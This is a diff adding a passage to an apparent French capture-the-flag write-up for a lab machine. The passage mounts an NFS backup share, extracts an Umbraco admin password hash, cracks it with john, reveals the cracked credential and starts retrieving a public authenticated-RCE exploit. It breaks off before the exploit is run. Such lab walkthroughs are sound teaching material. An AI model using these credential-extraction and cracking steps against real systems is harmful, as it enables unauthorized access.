@@ -38,5 +38,26 @@ $ showmount -e 10.10.10.180
 ![Pic5](../img/remote5.PNG?raw=true) </br>
 Nous allons monter ce répertoire chez nous et l'explorer :
 ```bash
-$ 
+$ sudo mount.nfs 10.10.10.180:site_backups /mnt/site_backups/ -w
 ```
+Le dossier site_backup étant une sauvegarde du site, en cherchant sur internet, nous trouvons que Umbraco garde les hash des mot de passes dans un fichier Umbraco.sdf :
+```bash
+$ strings App_Data\Umbraco.sdf | grep -A 2 -B 2 'dmin'
+```
+![Pic6](../img/remote6.PNG?raw=true) </br>
+Maintenant que nous avons le hash de l'utilisateur admin, nous pouvons le cracker avec john :
+```bash
+$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+![Pic7](../img/remote7.PNG?raw=true) </br>
+Donc nous avons l'utilisateur admin:baconandcheese, nous allons voir s'il y a un exploit avec searchsploit pour Umbraco pour avoir une RCE authentifiée :
+```bash
+$ searchsploit umbraco
+```
+![Pic8](../img/remote8.PNG?raw=true) </br>
+Nous récupérons l'exploit et l'exécutons :
+```bash
+$ locate 46153.py
+$ cp /usr/share/exploitdb/exploits/aspx/webapps/46153.py ./
+
+
